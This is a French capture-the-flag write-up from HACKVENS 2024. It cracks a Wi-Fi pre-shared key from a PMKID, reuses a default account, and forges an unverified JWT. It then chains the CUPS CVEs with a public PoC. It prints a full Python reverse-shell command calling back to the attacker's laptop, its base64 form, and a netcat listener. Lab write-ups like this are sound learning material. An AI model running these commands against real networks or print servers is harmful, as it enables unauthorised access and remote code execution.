J'ai flag ce challenge lors du CTF HACKVENS 2024 à Lille. 
La description du challenge indique qu'une machine est accessible sur le réseau wifi "captaincups-wifi" à l'adresse 192.168.12.1.  

On lance le mode monitor sur notre carte wifi externe (sudo iwconfig wlan0 mode monitor) 
Ensuite on lance un aireplay-ng pour checker les réseaux autours : 

```
BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   3E:B0:1E:81:67:3D  -43    0 - 1      0        1                                                                           
 (not associated)   A4:97:B1:15:8E:F5  -73    0 - 6     20        4         captaincups-wifi 
```

Ensuite on nous donne également une capture wireshark avec un seul message eapol (pas le handshake complet habituel à cracker avec aircrack-ng). Néanmoins on retrouve dans le packet les infos dont on a besoin pour crack la pre shared key : 

- La PMKID
- Le SSID
- La mac de l'ap
- La mac du client 

Ensuite on trouve un script sur github pour cracker la pre-shared key avec ces infos : 

```
(PYTHON_TOOLS) eddymalou@parrot:~/Documents/CTF/HACKVENS/web$ python3 crack.py 

PMKID:                     476160903076f4d82091e345e3207f8f
SSID:                      captaincups-wifi
AP MAC Address:            00:22:6b:fb:49:2b
Client MAC Address:        00:c0:ca:62:a4:f6

Attempt crack with these settings? (y/n): y
Attempting to crack password...

e7a8005bd36ba5a9e5e0bcbd4211c51f
7412a40d38d4a8fadd8d1fa96c318458
4d4263d4ce866da5326a6622461cf5b2
0fa989dd03b2166d7acfbf3685c7ac62
d4db1b5a9b2a146c85fe90dcf2a5a40a
ea0011573095ede0f167d47eaab4e9e3
7c8129ea1cb3e0f1ea7d431d4745bf0a
... rock you go brrrrrrrrrrrrrr
0916d4be2a126c895d7a601fc41e1b4b
be2dd1e083afce2435e02fb6930e0b8c
0f0991dc41d0a911ec081e6094484ff9
974bcc37fa8c66d31ddfabcca2faee2f
3c1017956134e4c34ad4cbdf8e901df2
daa217a986f804dbeb8a3b96fe64c9c9
628af9ee99ff42dfc6c62b7967119c05
1ad47773260d02331f28cecad3da2040
7c1adb19fa060c297d70c8694be9d87c
476160903076f4d82091e345e3207f8f - Matches captured PMKID
Password Cracked!

SSID:              captaincups-wifi
Password:          blackcaptain08  
```

On peut se connecter au réseau wifi hidden avec : 

`nmcli dev wifi connect "captaincups-wifi" password "blackcaptain08" hidden yes`

Ensuite en accédant à la machine en 192.168.12.1 on arrive bien sur un serveur web avec un commentaire html : 

`<!-- TODO : Supprimer le compte par défaut user:1_a10V3_Z4Z0U -->`

Dans robots.txt on trouve les informations suivantes 

![Image robots.txt](HACKVENS/2024/images/robots_text.png)

![Image todo.txt](HACKVENS/2024/images/todo_text.png)

-------------------------------------------------------

Ensuite on se connecte avec le user donné via les commentaires html et on a un JWT mais la signature n'est pas vérifiée, on peut juste le modifier en changeant "user" en "supercaptain" avec jwt.io notamment : 

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoic3VwZXJjYXB0YWluIiwiZXhwIjoxNzMyMzI0NzU3fQ.imLNhfONY95-Jev-yQaG8FlCoQo1LtbbRYjSZF-qWfU
```

```
{
  "username": "user",
  "role": "supercaptain",
  "exp": 1732324757
}
```

On peut maintenant refresh là page et on arrive sur ça : 

![Page admin impression](test_impression.png)

En entrant une adresse IP, le serveur déclenche une impression vers cette dernière. Grâce au nom de la capture réseau (cups.pcap), nous comprenons qu'il faut exploiter la / les récentes CVEs sur cups.
En faisant quelques recherches on tombe sur le répo suivant avec un poc et une explication des CVEs : https://github.com/0xCZR1/PoC-Cups-RCE-CVE-exploit-chain

- **CVE-2024-47176**: Unrestricted Packet Processing on UDP Port 631, allowing unauthenticated remote attackers to force CUPS to contact an attacker's IPP server.
- **CVE-2024-47076**: Improper validation of IPP attributes in `libcupsfilters`, which allows attacker-controlled data to be processed as valid.
- **CVE-2024-47175**: Injection of malicious data into PPD files via `libppd`, allowing for command execution during print jobs.
- **CVE-2024-47177**: Command injection via `foomatic-rip`, allowing attackers to execute arbitrary commands on the system.

La première CVE (47176) est inutile dans notre cas, car nous avons directement un moyen de trigger une impression depuis la web view. Les autres néanmoins sont utiles et permettent d'obtenir une RCE. 
Nous tentons d'utiliser le POC de ce même répo mais sans succès : le port 631 de la machine cible étant fermée le printer discovery ne peut pas s'effectuer correctement. Nous trouvons un autre [PoC](https://github.com/RickdeJager/cupshax) qui lui implémente différement les CVEs : `This PoC uses dns-sd printer discovery, so the target must be able to receive the broadcast message, i.e. be on the same network. `

```
└──╼ #python3 cupshax.py --ip 0.0.0.0 --command "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"192.168.12.45\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'" --port 8631
[+] Wrapping command in base64...
[+] Command: echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC4xMi40NSIsNDQ0NCkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9zaCIpJw==|base64 -d|sh
[+] Starting IPP server on 0.0.0.0:8631..
```

Ensuite on lance un `nc -lnvp 4444` et on trigger une impression depuis la webview vers notre laptop en `192.168.12.45` : 
![Payload sent](HACKVENS/2024/images/payload_envoye.png)

On chope notre shell et un flag.txt : 
![Fake flag](HACKVENS/2024/images/false_espoir.png)

La solve "légit" était de relancer une impression avec un wireshark qui tourne sur notre laptopt et on extrait le pdf depuis la capture dans le IPP response : 
![IPP response](HACKVENS/2024/images/IPP_response.png)
l
Dans notre cas nous avons simplement `base64 doc/thomas-ruyant-pos.pdf` ctrl + shift + c
Et sur notre laptop `echo -n "base64 string du pdf" | base64 -d > flag.pdf`
![Real flag](HACKVENS/2024/images/flag_final.png)

Le challenge était vraiment sympa mais seul problème les neuilles qui fuzzaient le serveur web pour rien (instance partagée qui a crashée pas mal de fois). Autre galère rencontrée : pas réussir à faire marcher le premier poc. Et je testais ma RCE avec un `python3 -m http.server 1234` en local et un payload du style `curl http://ip_laptop:1234/` mais je ne recevais rien car la machine cible n'avait pas `curl` d'installé :/

